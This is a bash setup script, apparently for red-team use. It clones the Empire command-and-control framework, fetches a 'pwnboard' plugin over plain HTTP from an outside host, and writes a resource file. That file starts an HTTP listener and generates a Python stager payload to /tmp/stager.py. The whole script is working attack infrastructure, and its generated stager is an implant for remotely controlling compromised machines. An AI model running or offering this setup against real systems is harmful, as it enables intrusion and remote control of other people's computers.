#!/bin/bash

# Install empire
git clone https://github.com/empireproject/empire

# Install the pwnboard and search plugins
curl http://pwnboard.win/install/empire > empire/plugins/pwnboard.py
cp search.py empire/plugins/

cp python_raw.py empire/lib/stagers/multi/

# Generate the resource file to run at startup
echo -e """
plugin pwnboard
plugin search
listeners
uselistener http
set Name external
set DefaultDelay 15
set DefaultLostLimit 10
execute
main
usestager multi/python_raw
set Listener external
set Outfile /tmp/stager.py
generate
""" > load.rc 

echo "run empire with ./empire --resource load.rc"